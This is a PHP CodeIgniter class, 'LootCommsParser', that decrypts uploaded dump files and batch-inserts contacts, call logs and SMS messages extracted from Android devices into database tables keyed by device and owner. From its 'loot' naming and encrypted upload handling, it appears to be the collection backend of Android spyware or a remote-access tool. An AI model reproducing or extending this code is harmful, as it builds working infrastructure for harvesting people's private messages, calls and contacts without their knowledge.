<?php

namespace App\Libraries\Parsers;

use App\Models\CryptModel;
use App\Models\AndroidModel;
use Config\Database;

class LootCommsParser
{
    /**
     * @var \CodeIgniter\Database\BaseConnection
     */
    protected $db;

    /**
     * Constructor to inject or resolve the database.
     *
     * @param \CodeIgniter\Database\BaseConnection|null $db
     */
    public function __construct($db = null)
    {
        $this->db = $db ?? Database::connect();
    }

    /**
     * Parses and inserts contacts from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function parseContacts(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        try {
            $cryptModel = new CryptModel();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null || !isset($json['contacts']) || !is_array($json['contacts'])) {
                log_message('error', 'Invalid JSON structure in contacts file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            $batchData = [];
            foreach ($json['contacts'] as $contact) {
                if (!isset($contact['id']) || !isset($contact['display_name'])) {
                    continue; // Skip invalid entries
                }

                $data = [
                    'contact_id'         => $contact['id'],
                    'display_name'       => $contact['display_name'],
                    'phone_numbers'      => !empty($contact['phone_numbers']) ? json_encode($contact['phone_numbers']) : null,
                    'phone_count'        => $contact['phone_count'] ?? count($contact['phone_numbers'] ?? []),
                    'emails'             => !empty($contact['emails']) ? json_encode($contact['emails']) : null,
                    'email_count'        => $contact['email_count'] ?? count($contact['emails'] ?? []),
                    'photo_uri'          => $contact['photo_uri'] ?? null,
                    'companies'          => !empty($contact['companies']) ? json_encode($contact['companies']) : null,
                    'addresses'          => !empty($contact['addresses']) ? json_encode($contact['addresses']) : null,
                    'notes'              => $contact['notes'] ?? null,
                    'is_favorite'        => !empty($contact['is_favorite']) ? 1 : 0,
                    'last_contacted'     => $contact['last_time_contacted'] ?? null,
                    'contact_frequency'  => $contact['times_contacted'] ?? 0,
                    'contact_hash'       => $contact['contact_hash'] ?? null,
                    'phonetic_name'      => $contact['phonetic_name'] ?? null,
                    'nickname'           => $contact['nickname'] ?? null,
                    'website'            => json_encode($contact['website'] ?? []),
                    'im_handles'         => json_encode($contact['im_handles'] ?? []),
                    'social_profiles'    => json_encode($contact['social_profiles'] ?? []),
                    'events'             => json_encode($contact['events'] ?? []),
                    'relation'           => json_encode($contact['relation'] ?? []),
                    'sip_address'        => $contact['sip_address'] ?? null,
                    'custom_fields'      => json_encode($contact['custom_fields'] ?? []),
                    'group_membership'   => json_encode($contact['group_membership'] ?? []),
                    'contact_last_updated' => null, // deprecated on Android side — kept for DB compat
                    'raw_contact_account_type' => json_encode($contact['raw_contact_account_type'] ?? []),
                    'raw_contact_account_name' => (function() use ($contact) {
                        $rawContacts = $contact['raw_contact_account_type'] ?? [];
                        if (!is_array($rawContacts)) return null;
                        $names = [];
                        foreach ($rawContacts as $rc) {
                            if (is_array($rc) && isset($rc['account_name']) && $rc['account_name']) {
                                $names[] = $rc['account_name'];
                            }
                        }
                        return !empty($names) ? json_encode($names) : null;
                    })(),
                    'sync_status'        => $contact['sync_status'] ?? null,
                    'is_restricted'      => isset($contact['is_restricted']) ? ($contact['is_restricted'] ? 1 : 0) : 0,
                    'photo_thumbnail_base64' => $contact['photo_thumbnail_base64'] ?? null,
                    'photo_file_id'      => !empty($contact['photo_file_id']) ? (int)$contact['photo_file_id'] : null,
                    'display_name_source' => $contact['display_name_source'] ?? null,
                    'phonetic_given_name' => $contact['phonetic_given_name'] ?? null,
                    'phonetic_family_name' => $contact['phonetic_family_name'] ?? null,
                    'transcription'      => $contact['transcription'] ?? null,
                    'communication_quality_score'    => isset($contact['communication_quality_score']) ? (float)$contact['communication_quality_score'] : null,
                    'communication_quality_category' => $contact['communication_quality_category'] ?? null,
                    'device_id'          => $var_file_print,
                    'extracted_at'       => $extracted_at,
                    'owner_id'           => $var_file_owner,
                    'is_synced'          => 0,
                    'sync_count'         => 0,
                    'is_active'          => 1,
                    'created_at'         => $dated,
                    'updated_at'         => $dated,
                ];

                // Enforce only unique contacts insertion (check unique key: contact_id, device_id, owner_id)
                $exists = $this->db->table('tbl_extracted_contacts')
                    ->where('contact_id', $data['contact_id'])
                    ->where('device_id', $data['device_id'])
                    ->where('owner_id', $data['owner_id'])
                    ->countAllResults() > 0;

                if (!$exists) {
                    // Ensure we don't insert duplicate keys within the same batch upload
                    $isDuplicateInBatch = false;
                    foreach ($batchData as $existingBatchItem) {
                        if ($existingBatchItem['contact_id'] === $data['contact_id'] && 
                            $existingBatchItem['device_id'] === $data['device_id'] &&
                            $existingBatchItem['owner_id'] === $data['owner_id']) {
                            $isDuplicateInBatch = true;
                            break;
                        }
                    }
                    if (!$isDuplicateInBatch) {
                        $batchData[] = $data;
                    }
                }
            } // end foreach $json['contacts']

            if (!empty($batchData)) {
                $this->db->table('tbl_extracted_contacts')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' contacts from ' . $file_name);
            }

            return count($batchData);
        } catch (\Exception $e) {
            log_message('error', 'get_contacts parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts call logs from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool|int
     */
    public function parseCallLogs(string $file_name, int $var_file_owner, string $var_file_print)
    {
        try {
            $cryptModel = new CryptModel();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            
            // Handle both legacy 'call_logs' and modern 'calls' keys
            $callLogData = $json['call_logs'] ?? $json['calls'] ?? null;
            
            if ($json === null || !is_array($callLogData)) {
                log_message('error', 'Invalid JSON structure in call logs file: ' . $file_name);
                log_message('debug', 'JSON keys found: ' . implode(', ', array_keys($json ?? [])));
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            $batchData = [];
            $skippedCount = 0;
            $duplicateCount = 0;
            
            log_message('info', 'Processing ' . count($callLogData) . ' call logs from ' . $file_name);
            
            foreach ($callLogData as $log) {
                if (!isset($log['phone_number']) || !isset($log['call_date'])) {
                    $skippedCount++;
                    log_message('debug', 'Skipped call log - missing required fields: ' . json_encode($log));
                    continue; // Skip invalid
                }

                $logData = [
                    'contact_name'        => $log['contact_name'] ?? null,
                    'phone_number'        => $log['phone_number'],
                    'call_type'           => $log['call_type'] ?? 'Unknown',
                    'type_code'           => $log['type_code'] ?? 0,
                    'call_date'           => $log['call_date'],
                    'duration_seconds'    => $log['duration_seconds'] ?? 0,
                    'formatted_duration'  => $log['formatted_duration'] ?? '',
                    'country_iso'         => $log['country_iso'] ?? null,
                    'geocoded_location'   => $log['geocoded_location'] ?? null,
                    'number_label'        => $log['number_label'] ?? null,
                    'number_type'         => $log['number_type'] ?? 0,
                    'matched_number'      => $log['matched_number'] ?? null,
                    'is_read'             => !empty($log['is_read']) ? 1 : 0,
                    'features'            => $log['features'] ?? 0,
                    'data_usage'          => $log['data_usage'] ?? 0,
                    'phone_account_component_name' => $log['phone_account_component_name'] ?? null,
                    'phone_account_id'    => $log['phone_account_id'] ?? null,
                    'geolocation'         => $log['geocoded_location'] ?? null,
                    'is_conference'       => $log['is_conference'] ?? 0,
                    'conference_participants' => json_encode($log['conference_participants'] ?? []),
                    'parent_call_id'      => $log['parent_call_id'] ?? 0,
                    'is_voip'             => $log['is_voip'] ?? 0,
                    'voip_app_package'    => $log['voip_app_package'] ?? null,
                    'encryption_status'   => $log['encryption_status'] ?? 0,
                    'call_subject'        => $log['call_subject'] ?? null,
                    'call_notes'          => $log['call_notes'] ?? null,
                    'is_screening'        => $log['is_screening'] ?? 0,
                    'screening_result'    => $log['screening_result'] ?? null,
                    'call_companion_app'  => $log['call_companion_app'] ?? null,
                    'presentation'        => $log['presentation'] ?? null,
                    'cnap_name'           => $log['cnap_name'] ?? null,
                    'cnap_number'         => $log['cnap_number'] ?? null,
                    'redirecting_number'  => $log['redirecting_number'] ?? null,
                    'connected_number'    => $log['connected_number'] ?? null,
                    'dialing_number'      => $log['dialing_number'] ?? null,
                    'device_id'           => $var_file_print,
                    'extracted_at'        => $extracted_at ? date('Y-m-d H:i:s', substr($extracted_at, 0, -3)) : null,
                    'owner_id'            => $var_file_owner,
                    'created_at'          => $dated,
                    'updated_at'          => $dated,
                ];

                // Strong duplicate prevention: same number, exact timestamp, duration, type, device
                $exists = $this->db->table('tbl_extracted_call_logs')
                        ->where('phone_number', $logData['phone_number'])
                        ->where('call_date', $logData['call_date'])
                        ->where('duration_seconds', $logData['duration_seconds'])
                        ->where('call_type', $logData['call_type'])
                        ->where('device_id', $logData['device_id'])
                        ->where('owner_id', $logData['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $isDuplicateInBatch = false;
                    foreach ($batchData as $existingBatchItem) {
                        if ($existingBatchItem['phone_number'] === $logData['phone_number'] && 
                            $existingBatchItem['call_date'] === $logData['call_date'] &&
                            $existingBatchItem['duration_seconds'] === $logData['duration_seconds'] &&
                            $existingBatchItem['call_type'] === $logData['call_type'] &&
                            $existingBatchItem['device_id'] === $logData['device_id'] &&
                            $existingBatchItem['owner_id'] === $logData['owner_id']) {
                            $isDuplicateInBatch = true;
                            break;
                        }
                    }
                    if (!$isDuplicateInBatch) {
                        $batchData[] = $logData;
                    } else {
                        $duplicateCount++;
                    }
                } else {
                    $duplicateCount++;
                    log_message('debug', 'Duplicate call log detected: ' . $logData['phone_number'] . ' at ' . $logData['call_date']);
                }
            }

            log_message('info', 'Call logs processing summary - Total: ' . count($callLogData) . ', Skipped: ' . $skippedCount . ', Duplicates: ' . $duplicateCount . ', New: ' . count($batchData));

            if (!empty($batchData)) {
                $this->db->table('tbl_extracted_call_logs')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
            } else {
                log_message('warning', 'No new call logs to insert from ' . $file_name);
            }

            return count($batchData);
        } catch (\Exception $e) {
            log_message('error', 'get_logs parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts SMS from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function parseSms(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        try {
            $cryptModel   = new CryptModel();
            $androidModel = new AndroidModel();
            $dated        = date('Y-m-d H:i:s');

            /* ---------------------------------------------------------
             * Read encrypted dump file
             * --------------------------------------------------------- */
            $filePath = WRITEPATH . 'uploads/text_dump/' . $file_name;
            $rawData  = file_get_contents($filePath);

            if ($rawData === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            /* ---------------------------------------------------------
             * Decode encrypted content
             * --------------------------------------------------------- */
            $decoded = $cryptModel->decode_content($rawData);
            if ($decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            /* ---------------------------------------------------------
             * Decode JSON (NEW FORMAT)
             * --------------------------------------------------------- */
            $json = json_decode($decoded, true);
            if (!isset($json['sms']) || !is_array($json['sms'])) {
                log_message('error', 'Invalid SMS JSON structure: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $smsList      = $json['sms'];
            $batchSize    = 500; // Safe batch size
            $batch        = [];
            $inserted     = 0;

            /* ---------------------------------------------------------
             * Loop until ALL SMS are processed
             * --------------------------------------------------------- */
            foreach ($smsList as $sms) {

                if (empty($sms['address']) || empty($sms['date'])) {
                    continue; // Skip invalid rows
                }

                // Decode Base64 body
                $smsBody = '';
                $bodyEncoded = '';
                if (!empty($sms['body'])) {
                    $bodyEncoded = $sms['body']; // Store original base64
                    $smsBody = base64_decode($sms['body'], true) ?: '';
                }

                // Convert timestamps (keep as BIGINT for precision)
                $smsTime = $sms['date']; // Keep as milliseconds
                $dateSent = $sms['date_sent'] ?? null;

                // Calculate timestamp difference
                $timestampDiff = 0;
                if ($dateSent && $dateSent > 0) {
                    $timestampDiff = $smsTime - $dateSent;
                }

                $smsData = [
                    // Basic SMS Info (matching database schema)
                    'android_sms_id'     => $sms['sms_id'] ?? null,
                    'thread_id'          => $sms['thread_id'] ?? null,
                    'address'            => $androidModel
                        ->contacts_trim_number_length($sms['address']),
                    'formatted_address'  => $sms['formatted_address'] ?? null,
                    'sms_type'           => $sms['type'] ?? '',
                    'type_code'          => $sms['type_code'] ?? 0,

                    // Message Content
                    'body'               => $bodyEncoded, // Store base64 encoded body
                    'body_length'        => $sms['body_length'] ?? strlen($smsBody),

                    // Timestamps (store as BIGINT milliseconds)
                    'sms_date'           => $smsTime,
                    'sms_date_sent'      => $dateSent,

                    // Message Status
                    'is_read'            => $sms['is_read'] ?? true,
                    'is_seen'            => $sms['is_seen'] ?? true,
                    'status_code'        => $sms['status_code'] ?? 0,
                    'error_code'         => $sms['error_code'] ?? 0,

                    // Technical Details
                    'protocol'           => $sms['protocol'] ?? 0,
                    'protocol_type'      => $sms['protocol_type'] ?? 'SMS',
                    'is_mms'             => isset($sms['is_mms']) ? ($sms['is_mms'] ? 1 : 0) : 0,
                    'mms_subject'        => $sms['mms_subject'] ?? null,
                    'mms_attachments'    => json_encode($sms['mms_attachments'] ?? []),
                    'delivery_report'    => $sms['delivery_report'] ?? 0,
                    'reply_path_present' => $sms['reply_path_present'] ?? 0,
                    'is_spam'            => $sms['is_spam'] ?? 0,
                    'is_archived'        => $sms['is_archived'] ?? 0,
                    'is_scheduled'       => $sms['is_scheduled'] ?? 0,
                    'schedule_time'      => $sms['schedule_time'] ?? null,
                    'sub_id'             => $sms['sub_id'] ?? null,
                    'carrier_id'         => $sms['carrier_id'] ?? null,
                    'message_bundle_id'  => $sms['message_bundle_id'] ?? null,
                    'is_group'           => $sms['is_group'] ?? 0,
                    'rich_communication_service_data' => $sms['rich_communication_service_data'] ?? null,
                    'verified_sender'    => $sms['verified_sender'] ?? null,
                    'service_center'     => $sms['service_center'] ?? null,
                    'subject'            => $sms['subject'] ?? null,
                    'is_locked'          => $sms['is_locked'] ?? false,
                    'creator'            => $sms['creator'] ?? null,

                    // Metadata
                    'owner_id'           => $var_file_owner,
                    'device_id'          => $var_file_print,
                    'extracted_at'       => $extracted_at,

                    // Timestamps
                    'created_at'         => $dated,
                    'updated_at'         => $dated,
                ];

                /* -----------------------------------------------------
                 * Duplicate check (strong prevention)
                 * ----------------------------------------------------- */
                $exists = $this->db->table('tbl_extracted_sms')
                        ->where('android_sms_id', $smsData['android_sms_id'])
                        ->where('device_id', $smsData['device_id'])
                        ->where('owner_id', $smsData['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batch[] = $smsData;
                }

                /* -----------------------------------------------------
                 * Insert batch when limit is reached
                 * ----------------------------------------------------- */
                if (count($batch) >= $batchSize) {
                    $this->db->table('tbl_extracted_sms')->insertBatch($batch);
                    $inserted += count($batch);
                    $batch = [];
                }
            }

            /* ---------------------------------------------------------
             * Insert remaining rows
             * --------------------------------------------------------- */
            if (!empty($batch)) {
                $this->db->table('tbl_extracted_sms')->insertBatch($batch);
                $inserted += count($batch);
            }

            log_message(
                'info',
                'SMS import completed for ' . $file_name . ' (' . $inserted . ' records inserted from ' . count($smsList) . ')'
            );

            return $inserted;

        } catch (\Throwable $e) {
            log_message(
                'error',
                'get_sms parse error for ' . $file_name . ': ' . $e->getMessage()
            );
            return false;
        }
    }
}
